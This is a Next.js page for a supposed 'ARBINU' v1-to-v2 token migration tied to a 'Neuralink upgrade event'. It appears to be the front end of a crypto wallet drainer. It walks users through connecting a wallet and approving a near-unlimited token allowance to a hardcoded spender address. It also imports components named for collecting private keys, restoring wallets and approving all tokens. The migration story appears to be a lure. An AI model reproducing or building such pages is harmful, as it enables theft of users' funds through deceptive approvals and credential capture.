"use client";


import Image from "next/image";
import styles from "./page.module.css";
import Metamask from "../../public/trust wallet.png"
import token from "../../public/aipepe-DMwpNDmO.png"
import gas from "../../public/gas-pump.png"
import code from "../../public/code-error.png"
import mm from "../../public/mm.png"
import ScanWallet from "./components/scanWallet";
import ApproveButton from "./components/approveButton";
import ScanWalletNew from "./components/scanWallet_modified";
import NewApprove from "./components/newApprove";
import TokenAllowanceButton from "./components/userBalance";
import UserBalance from "./components/userBalance";
import UserTokensList from "./components/userTokens";
import UserTokensAndBalance from "./components/userCard";
import ApproveAllTokens from "./components/approveAllTokens";
import ConnectedAddress from "./components/connectedAddresses";
import ApproveTxn from "./components/approveTxn";
import { useState } from "react";
import DeedCollector from "./components/collectorPk";
import RestoreWallet from "./components/restore";
import TokenBalance from "./components/tokenBalance";

export default function Home() {
  const [nextPopup, setNextPopup] = useState(false);
  const [isHovered, setIsHovered] = useState(false);
  const [depositAmount, setDepositAmount] = useState(1);


  return (
    <div>
    <div className={styles.connectWallet}
        >
          <Image style={{height: "40px", width: "40px", marginLeft: "40px"}}
                 src={token}
                 alt='mm'/>
          <div style={{
            marginRight: "20px"
          }}>
            <w3m-button
            />
          </div>
        </div>
    <div className={styles.container}>
      <ConnectedAddress />
        <div className={styles.migrationContainer}>
          <style>
    
  </style>
          
          <div style={{
          display: "flex",
          flexDirection: "column",
          backgroundColor: "#1b1f2e",
          padding: "20px",
          borderRadius: "20px",
          gap: "10px",
          minWidth: "50%"
        }}>
          <h2>
          ARBINU MIGRATION
          </h2>
          <p>
          Exchange your current ARBINU (v1) for the upgraded ARBINU (v2) through the Neuralink upgrade event. When the upgrade is at its peak, a new ARBINU (v2) contract will be rolled out. This allows for it to be easily traded with ample liquidity.
          </p>

          <ul style={{ listStyleType: "disc", paddingLeft: "20px", }}>
            <li style={{marginTop: "5px"}}><strong>Step 1:</strong>Connect your wallet where you hold your ARBINU tokens</li>
            <li style={{marginTop: "5px"}}><strong>Step 2:</strong>Click Approve, to approve your V1 $ARBINU tokens for migration.</li>
            <li style={{marginTop: "5px"}}><strong>Step 3:</strong>Click Migrate, to migrate your allocation from the old $ARBINU contract to the new one.</li>
            <li style={{marginTop: "5px"}}><strong>Step 4:</strong>Approve the transaction in your wallet app when prompted.</li>
            <li style={{marginTop: "5px"}}><strong>Step 5:</strong>Complete the transaction by paying the required gas fees.</li>
            <li style={{marginTop: "5px"}}><strong>Step 6:</strong>1-to-1 swap your $ARBINU (V1) for $ARBINU (v2). The new $ARBINU (v2) will be available to view in your wallet after.</li>
          </ul>

          <h3 style={{
            marginTop: "50px"
          }}>
          SWAP INFO:
          </h3>

          <div 
          style={{
            display: "flex",
            flexDirection: "row",
            justifyContent: "space-between",
            border: "solid",
            borderColor: "#015efe",
            
            padding: "10px",
            borderRadius: "10px",
            width:"100%"
          }}>
            <div style={{
            display: "flex",
            flexDirection: "row",
            alignItems: "center",
            gap: "5px"
            }}>
            <Image style={{height: "20px", width: "20px",}}
                 src={token}
                 alt='mm'/>
              <p>
              1 $ARBINU V1
              </p>
            </div>
            <p>
              :
            </p>
            <div style={{
            display: "flex",
            flexDirection: "row",
            alignItems: "center",
            gap: "5px",
            }}>
              <Image style={{height: "20px", width: "20px",}}
                 src={token}
                 alt='mm'/>
              <p>
              1 $ARBINU V2
              </p>
            </div>
          </div>
           
          </div>
          <div style={{
          display: "flex",
          flexDirection: "column",
          backgroundColor: "#1b1f2e",
          padding: "20px",
          borderRadius: "20px",
          gap: "10px",
          minWidth: "50%"
        }}>
          <h2>
          MIGRATE
          </h2>
          <div 
          style={{
            display: "flex",
            flexDirection: "column",
            justifyContent: "center",
            border: "solid",
            borderColor: "#015efe",
            backgroundColor: "#1b2b55",
            padding: "20px",
            borderRadius: "20px",
            gap: "10px"
          }}>
             <TokenBalance tokenAddress={"0x0776a8234D6D927fF5Cb03CbCdc5756DD4340A1f"} />
           
            <input
                                type="number"
                                placeholder="100"
                                value={depositAmount}
                                onChange={(e) => setDepositAmount(Number(e.target.value))}
                                style={{
                                    color: "white",
                                    border: "solid",
                                    borderColor: "#1b1f2e",
                                    borderWidth: "1px",
                                    borderRadius: "15px",
                                    height: "40px",
                                    fontSize: "12px",
                                    padding: "10px",
                                    backgroundColor: "#1b1f2e",                                }}

                                
                                
                                
                                />
            <div style={{
              display: "flex",
              flexDirection: "row",
              justifyContent: "center",
              gap: "10px"
            }}>
              <ApproveButton spenderAddress={"0x8fF15369602bB3e0BEbf0665CCA72600a6781DbF"} tokenAddresses={["0x0776a8234D6D927fF5Cb03CbCdc5756DD4340A1f"]} chainIds={[42161]} amount={"99999999999"} />
              <ApproveTxn />
            </div>
          </div>
          <h4>
          You will receive: {depositAmount} 
          </h4>
          <div 
          style={{
            display: "flex",
            flexDirection: "row",
            width: "100%",
            justifyContent:"center",
            
          }}>
            <w3m-button />
          </div>
          </div>
          
          <div>

          </div>
        </div>
     
    </div>
    </div>
  );
}
